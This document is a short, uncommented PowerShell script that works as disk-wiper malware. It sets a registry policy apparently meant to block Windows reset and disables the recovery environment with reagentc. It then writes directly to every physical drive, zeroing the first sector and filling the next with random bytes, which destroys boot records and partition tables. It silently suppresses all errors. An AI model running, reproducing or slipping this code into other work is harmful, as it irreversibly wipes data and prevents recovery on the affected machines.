Import-Module Storage -ErrorAction SilentlyContinue
try {
    $disks = Get-Disk | Select-Object -ExpandProperty Number
} catch {
    exit
}

try {
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "AllowReset" -Value 0 -PropertyType DWORD -Force
} catch {
}

try {
    & reagentc /disable
} catch {
}

$buffer = New-Object byte[] 512
[System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($buffer)

foreach ($DriveNumber in $disks) {
    $drivePath = "\\.\PhysicalDrive$DriveNumber"
    try {
        $fs = [System.IO.FileStream]::new($drivePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)
        try {
            $fs.Write((New-Object byte[] 512), 0, 512)
            $fs.Write($buffer, 0, 512)
        } finally {
            $fs.Close()
        }
    } catch {
    }
}